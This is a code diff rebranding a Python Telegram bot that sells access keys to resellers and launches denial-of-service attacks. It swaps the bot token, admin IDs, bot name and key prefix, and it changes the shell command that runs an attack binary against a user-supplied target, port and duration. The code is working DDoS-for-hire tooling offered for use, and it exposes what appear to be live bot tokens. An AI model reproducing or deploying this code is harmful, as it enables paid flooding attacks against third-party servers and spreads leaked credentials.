@@ -13,17 +13,17 @@ from telebot import types
 from dateutil.relativedelta import relativedelta
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA')
+bot = telebot.TeleBot('7527768602:AAGzHw1r_xEPAOVydKBikd2Qgnv1u8UNCvk')
 
 # Admin user IDs
-admin_id = {"6768273586", "2007860433"}
+admin_id = {"5004674194", "2007860433"}
 
 # Files for data storage
 USER_FILE = "users.json"
 LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 RESELLERS_FILE = "resellers.json"
-BOT_LINK = "@MRiN_DiLDOS_bot"
+BOT_LINK = "@H3X_doctor_bot"
 escaped_bot_link = BOT_LINK.replace('_', '\\_')
 
 # Per key cost for resellers
@@ -62,10 +62,10 @@ def save_keys():
     with open(KEY_FILE, "w") as file:
         json.dump(keys, file)
 
-def create_random_key(length=10):
+def create_random_key(length=15):
     characters = string.ascii_letters + string.digits
     random_key = ''.join(random.choice(characters) for _ in range(length))
-    custom_key = f"MoY-ViP-{random_key.upper()}"
+    custom_key = f"NEERAJ-{random_key}"
     return custom_key
 
 def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
@@ -379,7 +379,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./mrin {target} {port} {time} 900"
+                full_command = f"./pushpa {target} {port} {time} 900"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
